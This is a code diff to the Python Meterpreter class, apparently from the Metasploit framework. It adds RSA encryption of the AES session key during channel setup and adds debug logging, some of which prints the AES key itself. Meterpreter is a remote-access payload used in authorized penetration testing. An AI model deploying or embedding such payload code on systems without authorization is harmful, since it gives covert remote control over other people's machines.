@@ -1218,8 +1218,14 @@ class PythonMeterpreter(object):
         self.transport.aes_key = rand_bytes(32)
         self.transport.aes_enabled = False
         response += tlv_pack(TLV_TYPE_SYM_KEY_TYPE, ENC_AES256)
-        # TODO: handle the RSA stuff
-        response += tlv_pack(TLV_TYPE_SYM_KEY, self.transport.aes_key)
+        # TODO: adjust this when we've moved from PEM to DER
+        pem = packet_get_tlv(request, TLV_TYPE_RSA_PUB_KEY)['value'].strip()
+        debug_print('[*] PEM is: ' + pem)
+        der = base64.b64decode(''.join(pem.split("\n")[1:-1]))
+        debug_print('[*] AES Key: {0:x}'.format(met_rsa.b2i(self.transport.aes_key)))
+        enc_key = met_rsa_encrypt(der, self.transport.aes_key)
+        debug_print('[*] Encrypted AES Key: {0:x}'.format(met_rsa.b2i(enc_key)))
+        response += tlv_pack(TLV_TYPE_ENC_SYM_KEY, enc_key)
         debug_print('[*] TLV encryption sorted')
         return ERROR_SUCCESS, response
 
@@ -1410,6 +1416,7 @@ class PythonMeterpreter(object):
                 debug_print('[*] running method ' + handler_name)
                 result = handler(request, response)
                 if result is None:
+                    debug_print("[-] Not a good result!")
                     return
                 result, response = result
             except Exception:
@@ -1424,8 +1431,10 @@ class PythonMeterpreter(object):
 
         reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
         if not reqid_tlv:
+            debug_print("[-] No request ID found")
             return
         response += tlv_pack(reqid_tlv)
+        debug_print("[*] Sending respond packet")
         return response + tlv_pack(TLV_TYPE_RESULT, result)
 
 # PATCH-SETUP-ENCRYPTION #
